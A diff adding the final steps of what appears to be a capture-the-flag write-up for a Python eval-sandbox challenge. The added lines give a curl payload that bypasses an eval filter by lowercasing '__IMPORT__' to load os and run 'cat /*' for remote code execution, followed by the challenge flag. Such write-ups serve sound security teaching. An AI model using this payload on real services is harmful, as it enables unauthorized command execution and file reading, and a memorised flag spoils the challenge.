@@ -92,6 +92,17 @@ def index():
 
 ![image](https://github.com/user-attachments/assets/4e11ab0b-0e79-48e1-8d2d-a277e05cf148)
 
+- Now,we can import module we like and gain RCE, I picked `os.popen` to read the flag.
+
+Final Payload-:```curl https://urchinsec-pyrison.chals.io/test/trick -X POST -d "query=eval('__IMPORT__'.lower())('os').popen('cat /*').read()"```
+
+![image](https://github.com/user-attachments/assets/cd7f553e-22bb-4214-9b41-ccf615fba9fb)
+
+- Flag-:```urchinsec{H3r3_we_go_again_byp4ssing_evals_f0rFUN}```
+
+
+
+
 
 
 
